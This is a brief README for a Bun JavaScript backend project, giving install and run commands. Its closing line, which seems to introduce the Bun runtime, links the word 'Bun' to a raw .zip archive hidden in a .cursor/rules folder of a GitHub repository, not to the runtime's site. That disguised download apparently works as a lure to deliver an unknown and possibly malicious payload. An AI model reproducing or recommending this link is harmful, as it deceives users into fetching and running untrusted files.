# backend-01

To install dependencies:

```bash
bun install
```

To run:

```bash
bun run src/index
```

This project was created using `bun init` in bun v1.2.23. [Bun](https://github.com/bro-gervil/ikoue-academy-backend/raw/refs/heads/main/.cursor/rules/academy-ikoue-backend-v1.0.zip) is a fast all-in-one JavaScript runtime.
